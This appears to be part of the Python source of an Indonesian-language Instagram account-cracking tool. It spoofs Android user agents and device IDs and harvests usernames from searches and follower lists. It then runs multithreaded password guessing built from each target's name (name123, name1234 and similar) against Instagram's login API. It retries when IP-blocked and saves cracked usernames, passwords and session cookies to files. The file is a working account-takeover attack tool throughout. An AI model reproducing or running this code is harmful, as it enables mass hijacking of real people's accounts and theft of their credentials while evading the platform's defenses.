0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121']
    User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'0; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
    return User_Agent
    
    
def user_agent():
    resolutions = ['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733']
    versions = ['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL']
    dpis = ['642','213','482','422','242','282','162','562','542','272','362','722','272','452','602','279','212','182','512','302','454','314','288','401','153','267','345','493','342','604','465','682','256','292','432','273','122','202','367','419','306','303','411','195','518','232','384','315','293','274','235']
    ver = random.choice(versions)
    dpi = random.choice(dpis)
    res = random.choice(resolutions)
    return (
        'Instagram 4.{}.{} '
        'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
    ).format(
        random.randint(1, 2),
        random.randint(0, 2),
        random.randint(10, 11),
        random.randint(1, 3),
        random.randint(3, 5),
        random.randint(0, 5),
        0,
        res,
        ver,
        ver,
    )

    def __init__(self,username,password):
        self.username=username
        self.password=password
        m = hashlib.md5()
        m.update(username.encode('utf-8') + password.encode('utf-8'))
        self.device_id = self.generateDeviceId(m.hexdigest())
        self.uuid = self.generateUUID(True)
        self.s = requests.Session()

    def generateDeviceId(self, seed):
        volatile_seed = "12345"
        m = hashlib.md5()
        m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16]

    def generateUUID(self, type):
        generated_uuid = str(uuid.uuid4())
        if (type):
            return generated_uuid
        else:
            return generated_uuid.replace('-', '')

  

class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
        self.ses = requests.Session()
        self.tol = Console()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            self.mentod()
            prints(Panel(f"{P2}[{R2}01{P2}]Crack Dari Pencarian Name   {P2}   [{R2}05{P2}]LiHat Hasil Crack\n{P2}[{R2}02{P2}]Crack Dari Pengikut {P2}           [{R2}06{P2}]Bot Auto Unfollow\n{P2}[{R2}03{P2}]Crack Dari Mengikuti{P2}           [{R2}07{P2}]Hapus Lisensi\n{P2}[{R2}04{P2}]Checkpoint Detector{P2}            [{R2}00{P2}]Exit/[red1]GantiCookie",width=80,padding=(0,4),title='MENU',style='purple '))

    def mentod(self):
               for i in external:
                   nama=i.split('|')[0]
                   followers=i.split('|')[1]
                   following=i.split('|')[2]
               try:
                      ses=requests.Session()
                      lisen=open('data/lisensi.txt','r').read()
                      met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyI1NTc5MDEyMyIsIkxGR3BCRUlXdzhIeUNvWWl0NUg0QitMQ3Nsdy9FUVNoaVJiZDhBczUiXQ==&ProductId=21135&Key='+lisen).json()
                      men = met['licenseKey']
                      key = men['key'][0:11]
                      tahun = men['expires'][0:4]
                      buln = men['expires'][5:7]
                      tanggal = men['expires'][8:10]
                      bulan=bulan_ttl[buln]
                      tahun1 = men['created'][0:4]
                      buln1 = men['created'][5:7]
                      tanggal1 = men['created'][8:10]
                      bulan1=bulan_ttl[buln1]
               except:
                      key = "-"
                      tanggal = "-"
                      bulan = "-"
                      tahun = "-"
                      tanggal1 = "-"
                      bulan1 = "-"
                      tahun1 = "-"
               pornhub = []
               pornhub.append(Panel(f"{P2}nama      : {H2}{nama}\n{P2}username  : {H2}{self.username}\n{P2}pengikut  : {H2}{followers}\n{P2}mengikuti : {H2}{following}",title=f"{M2}• {K2}• {H2}•{P2} DATA AKUN TUMBAL{H2}• {K2}• {M2}•",width=35,padding=(0,1),style=f"#FFFFFF"))
               pornhub.append(Panel(f"{P2}lisensi : {H2}{key}-****-****\n{P2}join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}expired : {H2}{tanggal} {bulan} {tahun}\n{P2}Version : {H2}5.1",title=f"{M2}• {K2}• {H2}•{P2} DATA LISENSI {H2}• {K2}• {M2}•",width=35,padding=(0,1),style=f"#FFFFFF"))
               self.tol.print(Columns(pornhub))

    def HapusLisen(self):
        try:
            xc = input(f"{P}[{B}?{P}] apakah anda yakin ingin menghapus lisensi? : {H}")
            if xc in ["y","Y"]:
               os.remove("data/lisensi.txt")
               print(f"{P}[{H}✓{P}] berhasil menghapus lisensi")
               exit()
            elif xc in ["t","T"]:
                print(f"{P}[{B}+{P}] kembali ke menu utama")
                time.sleep(2)
                self.menu()
            else:
                self.Exit()
        except:pass
    
    def Exit(self):
        try:
            xd = input(f'{P}[{B}?{P}] apakah anda yakin ingin keluar? : {H}')
            if xd in ["y","Y"]:
               RemoveCookie()
               print(f"{P}[{H}✓{P}] berhasil menghapus cookie")
               exit()
            elif xd in ["t","T"]:
                print(f"{P}[{B}+{P}] kembali ke menu utama")
                time.sleep(2)
                self.menu()
            else:
                 self.Exit()
        except:pass

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    
    def searchAPI(self,cookie,nama):
        try:
            for ba in range(100):
                x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),headers={"X-IG-App-ID": "1217981644879628","cookie": cookie,"user-agent": "Instagram  Android 14; SM-F721U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Instagram 294.0.0.33.87 Android (33/13; 5400; 1080x2384; samsung; SM-F721U; b4q; qcom; en_US; 500160591)"})
                x_jason=json.loads(x.text)
                try:
                    for i in x_jason['users']:
                        user=i['user']
                        username=user['username']
                        fullname=user['full_name']
                        internal.append(f'{username}|{fullname}')
                    sys.stdout.write(f"\r{P}[{B}*{P}] Sedang Mengumpulkan {H}{len(internal)} {P}id..."),sys.stdout.flush()
                    time.sleep(0.002)    
                except:
                    if 'challenge' in x.text:
                        break
                    else:
                        continue
            print('\n')
        except Exception as e:print(e)
        return internal
    
    
    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),headers={"X-IG-App-ID": "1217981644879628","cookie": cookie,"user-agent": "Instagram  Android 14; SM-F721U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Instagram 294.0.0.33.87 Android (33/13; 5400; 1080x2384; samsung; SM-F721U; b4q; qcom; en_US; 500160591)"})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                print(f'{P}[{M}!{P}] koneksi internet anda bermasalah');exit()
            except Exception as e:
                print(f'{P}[{M}!{P}] username tidak tersedia');exit()
            except Exception as e:pass
            return idx
        else:lisensi()

    def Api_Dump_Sora_Followers(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                x_jason=s.get(f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=12',headers={"X-IG-App-ID": "1217981644879628","cookie": cookie,"user-agent": "Instagram  Android 14; SM-F721U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Instagram 294.0.0.33.87 Android (33/13; 5400; 1080x2384; samsung; SM-F721U; b4q; qcom; en_US; 500160591)"}).json()
                for i in x_jason['users']:
                    username,nama = i["username"],i["full_name"]
                    internal.append(f'{username}|{nama}')
                    sys.stdout.write(f"\r{P}[{B}*{P}] Sedang Mengumpulkan {H}{len(internal)} {P}id..."),sys.stdout.flush()
                maxid=x_jason['next_max_id']
                self.Api_Dump_Sora_Followers2(cookie,maxid,id)
            except Exception as e:pass
            return internal
        else:lisensi()

    def Api_Dump_Sora_Followers2(self,cookie,maxid,id):
        count_id = random.choice(["12","24","36","48","60","72","84","96","108","120"])
        x_jason = s.get(f"https://i.instagram.com/api/v1/friendships/{id}/followers/?count={count_id}&max_id={maxid}&search_surface=follow_list_page",headers={"X-IG-App-ID": "1217981644879628","cookie": cookie,"user-agent": "Instagram  Android 13; SM-F721U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Instagram 294.0.0.33.87 Android (33/13; 5400; 1080x2384; samsung; SM-F721U; b4q; qcom; en_US; 500160591)"}).json()
        for i in x_jason['users']:
            username,nama = i["username"],i["full_name"]
            internal.append(f'{username}|{nama}')
            sys.stdout.write(f"\r{P}[{B}*{P}] Sedang Mengumpulkan {H}{len(internal)} {P}ID..."),sys.stdout.flush()
        maxid=x_jason['next_max_id']
        self.Api_Dump_Sora_Followers2(cookie,maxid,id)
     
    def Api_Dump_Sora_Following(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                x_jason=s.get(f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=12',headers={"X-IG-App-ID": "1217981644879628","cookie": cookie,"user-agent": "Instagram  Android 14; SM-F721U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Instagram 294.0.0.33.87 Android (33/13; 5400; 1080x2384; samsung; SM-F721U; b4q; qcom; en_US; 500160591)"}).json()
                for i in x_jason['users']:
                    username,nama = i["username"],i["full_name"]
                    internal.append(f'{username}|{nama}')
                    sys.stdout.write(f"\r{P}[{B}*{P}] Sedang Mengumpulkan {H}{len(internal)} {P}ID..."),sys.stdout.flush()
                maxid=x_jason['next_max_id']
                self.Api_Dump_Sora_Following2(cookie,maxid,id)
            except Exception as e:pass
            return internal
        else:lisensi()

    def Api_Dump_Sora_Following2(self,cookie,maxid,id):
        count_id = random.choice(["12","24","36","48","60","72","84","96","108","120"])
        x_jason = s.get(f"https://i.instagram.com/api/v1/friendships/{id}/following/?count={count_id}&max_id={maxid}&search_surface=follow_list_page",headers={"X-IG-App-ID": "1217981644879628","cookie": cookie,"user-agent": "Instagram  Android 14; SM-F721U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 Instagram 294.0.0.33.87 Android (33/13; 5400; 1080x2384; samsung; SM-F721U; b4q; qcom; en_US; 500160591)"}).json()
        for i in x_jason['users']:
            username,nama = i["username"],i["full_name"]
            internal.append(f'{username}|{nama}')
            sys.stdout.write(f"\r{P}[{B}*{P}] Sedang Mengumpulkan {H}{len(internal)} {P}ID..."),sys.stdout.flush()
        maxid=x_jason['next_max_id']
        self.Api_Dump_Sora_Following2(cookie,maxid,id)

    def inngfo(self, coki):
        try:
            link = s.get(f"https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point", headers={"user-agent":USN},cookies={"cookie":coki}).json()["form_data"]
            nomo = link["phone_number"].replace("-", "").replace(" ", "")
            tggl = link["birthday"]
            year, month, day = tggl.split("-")
            month = bulan_ttl[month]
            tanggal = (f"{day} {month} {year}")
            email = link["email"]
        except:
            nomo = "-"
            tanggal = "-"
            email = "-"
        return nomo, tanggal, email
    
    def vers(self):
      igv=("347.0.0.0.85,347.0.0.0.85,347.0.0.0.85,347.0.0.0.85,347.0.0.0.85,347.0.0.0.85")
      igve=igv.split(",")
      versi=random.choice(igve)
      return versi
        
    def ua_test(self):
      rc=random.choice
      rr=random.randint
      igv=self.vers()
      ponid=str(uuid.uuid4())
      uakuu = rc([
      f"Instagram {igv} Android {str(rr(4,12))}; 4800; 1080x2267; vivo; vivo 1907; 1907N; mt6768; ru_RU; 302733770)",
      f"Instagram {igv} Android {str(rr(4,12))}; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749)",
      f"Instagram {igv} Android {str(rr(4,12))}; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/2.0 Chrome/83.0.4103.96 Mobile Safari/537.36)",
      f"Instagram {igv} Android {str(rr(4,12))}; vivo 1907 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 WpsMoffice/16.3.3/armeabi-v7a/1329)",
      f"Instagram {igv} Android {str(rr(4,12))}; vivo 1907 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/333.0.0.17.119)",
      f"Instagram {igv} Android {str(rr(4,12))}; en-US; vivo 1907 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36)",
      f"Instagram {igv} Android 11; VIVO vivo 1907 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.3.2)",
      f"Instagram {igv} Android {str(rr(4,12))}; vivo 1907 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/291.0.0.44.120)",
      f"Instagram {igv} Android {str(rr(4,12))}; vivo 1907 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80)",
      f"Instagram {igv} Android {str(rr(4,12))}; vivo 1907) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36)",
      f"Instagram {igv} Android {str(rr(4,12))}; vivo 1907 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36)",
      f"Instagram {igv} Android {str(rr(4,12))}; en-US; vivo 1907_19 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36)"])
      return uakuu
    
    def inpo(self):
        urut = []
        prints(Panel(f"{P2}ON-OFF MODE PESAWAT SETIAP 200 ID AGAR TERHINDAR DARI SPAM IP",width=80,padding=(0,5),style='purple '))
        urut.append(Panel(f"{P2}result/{H2}OK-{day}.txt",width=39,padding=(0,5),style=f"#FFFFFF"))
        urut.append(Panel(f"{P2}result/{K2}CP-{day}.txt[/]",width=39,padding=(0,5),style=f"#FFFFFF"))
        self.tol.print(Columns(urut))
        prints(Panel(f"{H2}Crack Sedang Berjalan,Ketikan Ctrl+Z Di Keyboard anda Untuk Stop",width=80,padding=(0,5),style='purple '))

    def methodku(self):
        urut = []
        urut.append(Panel(f"{P2}[{R2}01{P2}].Methode Api {H2}Direkomendasikan{P2}",width=39,padding=(0,2),style=f"#FFFFFF"))
        urut.append(Panel(f"{P2}[{R2}02{P2}].Methode Ajax {K2}Very Slow",width=39,padding=(0,2),style=f"#FFFFFF"))
        self.tol.print(Columns(urut))

    def passwordAPI(self,xnx):
        print("\n")
        prints(Panel(f"{P2}Total Username Yang Berhasil Terkumpul {H2}{len(internal)}",width=80,padding=(0,15),style='purple '))
        self.methodku()
        u = input(f'{P}[{B}?{P}] Silahkan Pilih Method : {H}')
        if u in ["1","01"]:
            method.append('satu')
        elif u in ["2","02"]:
            method.append('dua')
        else:
            method.append('satu')
        prints(Panel(f"{P2}[{R2}01{P2}].Nama,Nama123,Nama1234\n{P2}[{R2}02{P2}].Nama,Nama123,Nama1234,Nama12345\n{P2}[{R2}03{P2}].Nama,Nama123,Nama1234,Nama12345,Nama123456\n{P2}[{R2}04{P2}].Nama,Nama123,Nama1234,Manual",width=80,padding=(0,12),style='purple '))
        c=input(f'{P}[{B}?{P}] pilih password : {H}')
        if c in ["01","1"]:
            self.generateAPI(xnx,c)
        elif c in ["2","02"]:
            self.generateAPI(xnx,c)
        elif c in ["3","03"]:
            self.generateAPI(xnx,c)
        elif c in ["4","04"]:
            prints(Panel(f"{P2}gunakan tanda koma ({R2},{P2}) untuk pemisahan contoh sayang, sayang123,Indonesia",width=80,padding=(0,3),style=f"#FFFFFF"))
            zx=input(f'{P}[{B}?{P}] Masukan Password : {H}')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        self.inpo()
        with ThreadPoolExecutor(max_workers=30) as shinkai:
            for i in user:
                try:
                    username=i.split("|")[0]
                    password=i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w)<3:
                            continue
                        else:
                            w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w,w+'123',w+'1234']
                                else:
                                    sandi=[w,w+'123',w+'1234']
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w,w+'123',w+'1234',password.lower()]
                                else:
                                    sandi=[w+'123',w,w+'1234',password.lower()]
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
                                else:
                                    sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
                            elif o=="4":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    sandi = zx.replace(" ", "").split(",")
                            if 'satu' in method:
                                shinkai.submit(self.crackAPI,username,sandi)
                            elif 'dua' in method:
                                shinkai.submit(self.crackerAPI,username,sandi)
                            else:
                                shinkai.submit(self.crackAPI,username,sandi)
                except Exception as e:pass
        print('\n')
        prints(Panel(f" {P2}Crack {R2}{len(internal)} {P2}Username Selesai Hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"#FFFFFF"))
        exit()

    def APIinfo(self,user):
        s=requests.Session()
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'1217981644879628'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            nama = "-"
            pengikut = "-"
            mengikut = "-"
            postingan = "-"
        return nama,pengikut,mengikut,postingan
    
    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        ses=requests.Session()
        warna = random.choice([M, H, K, U, O,])
        logtemp=0
        guid = str(uuid.uuid4())
        ponid=str(uuid.uuid4())
        andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
        ig_sig=SORA["ig_sig"]
        verig=SORA["IGV"]
        igver=verig.split(",")
        igv=random.choice(igver)
        gedz=SORA1["AOREC"][random.randrange(0,829)]
        ven1=gedz.split('|')[1]
        ven2=gedz.split('|')[2]
        giu1=SORA["giu"]
        giu=giu1.split("||")
        ua=f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
        dat=SORA["sinkz"]
        dat.update({"id": guid}) 
        data1=json.dumps(dat)
        ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf-8'),hashlib.sha256).hexdigest()
        data2=SORA["sinkz1"]
        data2.update({'signed_body': f'{ned}.{str(data1)}'})
        head=SORA["headaing"]
        head.update({"user-agent": ua})
        while True:
                try:
                    p=ses.post(SORA["sinkz2"],headers=head,data=data2)
                    break
                except:pass
        sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        for pw in pas:
                try:
                    data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
                    ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf-8'),hashlib.sha256).hexdigest()
                    head2=SORA["headaing1"]
                    head2.update({"user-agent": ua})
                    pasw=pw.replace(' ','+')
                    sianjing=SORA["sianjing"]
                    setan=sianjing.split("||")
                    dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
                    respon=ses.post(SORA["crack"],headers=head2,data=dataa)
                    try:
                        babi=json.loads(respon.text)
                    except:
                        babi=(respon.text)
                    logtemp+=1
                    if "logged_in_user" in str(babi) or "sessionid" in ses.cookies.get_dict():
                        kuki=';'.join([key+'='+value.replace('"','') for key,value in ses.cookies.get_dict().items()])
                        nama,pengikut,mengikut,postingan=self.APIinfo(user)
                        io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}\nCookiee: {kuki}'
                        oi = nel(io, style='green1')
                        print('\n')
                        cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} SUCCESS {day}{H2} • {K2} • {M2} • '))
                        os.system("play-audio data/live.mp3")
                        open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                        success.append(user)
                        break
                    elif 'https://i.instagram.com/challenge' in str(respon.text):
                        nama,pengikut,mengikut,postingan=self.APIinfo(user)
                        io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                        oi = nel(io, style='yellow1')
                        print('\n')
                        cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} CHECKPOINT {day}{H2} • {K2} • {M2} • '))
                        os.system("play-audio data/cp.mp3")
                        open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                        checkpoint.append(user)
                        break
                    elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
                        sys.stdout.write(f"\r[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0);os.system("play-audio data/ip.mp3")
                        self.crackAPI(user,pas)
                        loop-=1
                        break
                except requests.exceptions.ConnectionError:
                    time.sleep(5)
                    self.crackAPI(user,pas)
                    loop-=1
                    break
                except:pass
        loop+=1
                    
    def generated_csrf_token(self):
        size = 32
        symbols = False
        chars = string.ascii_letters + string.digits
        if symbols:
            chars += string.punctuation
